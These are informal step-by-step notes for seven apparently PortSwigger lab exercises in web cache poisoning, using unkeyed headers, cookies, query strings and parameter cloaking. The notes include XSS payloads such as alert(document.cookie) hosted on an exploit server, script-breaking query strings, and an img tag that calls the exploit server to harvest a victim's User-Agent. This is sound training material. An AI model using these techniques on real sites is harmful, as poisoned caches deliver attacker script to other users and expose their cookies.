#1 Lab: Web cache poisoning with an unkeyed header

    1. Send / to repeater
    2. Add a new header "X-Forwarded-Host: exploit.id and send the request
    3. In the exploit page change /exploit to /resources/js/tracking.js
    4. Save alert(document.cookie) and send the request until cache gets hit
    5. When cache gets hit you will see the alert with cookie in victim's browser

---------------------------------------------------------------------------------------------

#2 Lab: Web cache poisoning with an unkeyed cookie

    1. Send / to repeater
    2. Modify the parameter fehost="-alert(1)-" and send the request
    3. Open page in browser and keep refreshing until cache gets hit
    4. When cache gets hit you will see the alert in victim's browser

----------------------------------------------------------------------------------------------

#3 Lab: Web cache poisoning with multiple headers

    1. Send / to repeater
    2. Add cache buster in request and the main benefit of cache buster is that it'll affect only me not other live users
    3. Send request /?cb=cachebuster-hdakhfj to repeater and check paraminer for headers
    4. Add new header "X-Forwarded-Scheme: https and send the request
    5. Check paraminer and add new header X-Forwarded-Host: ex.com and send the request
    6. Send /resources/js/tracking.js to repeater and add cache buster nd both headers in it
    7. Add exploit server url in X-Forwarded-Host and send the request
    8. Remove cache buster from the request and send the request until cache gets hit and in exploit server change path to /resources/js/tracking.js and save alert(document.cookie) and send the request until cache gets hit

------------------------------------------------------------------------------------------------------

#4 Lab: Targeted web cache poisoning using an unknown header

    1. Send / to repeater and check for headers using paraminer
    2. Got new header X-Host and paste exploit server url in it and send the request and modify exploit server as done in previous labs.
    3. In response we can see it's showing missing user agent
    4. Do any comment <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" /> and see the activity logs of exploit server
    5. Copy User-agent from there and paste in request and send the request

-----------------------------------------------------------------------------------------------

#5 Lab: Web cache poisoning via an unkeyed query string

    1. Try cachebuster in difft headers like cookie,origin,accept etc...
    2. Add Origin: https://cachebuster-hdakhfj and send the request 
    3. Then after / add ?cb=cachebuster-hdakhfj'/><script>alert(1)</script> and send the request
    4. Remove cb from origin and merge with accept header and send the request
    5. Keep refreshing the page until cache gets hit and you will see the alert in victim's browser

---------------------------------------------------------------------------------------

#6 Lab: Web cache poisoning via an unkeyed query parameter

    1. Used paraminer on home page and got utm_content was missing
    2. Add that in home request  /?utm_content='/><script>alert(1)</script> keep sending until cache gets hit
    3. After it gets stored in cache remove it and open in browser and it's solved.

------------------------------------------------------------------------------------------

#7 Lab: Parameter cloaking

    1. Capture GET /js/geolocate.js?callback=setCountryCookie request
    2. Then add &cb=cachebuster-hudkfew after CountryCookie then add Origin cachebuster
    3. Send the request and check paraminer for headers and send the request
    4. Modify after CountryCookie to &utm_content=foo&callback=alert(1)
    5. Change alert value and remove utm thing
    6. Remove Origin and change alert value back to 1 and keep sending until cache gets re hit and it's solved

----------------------------------------------------------------------------------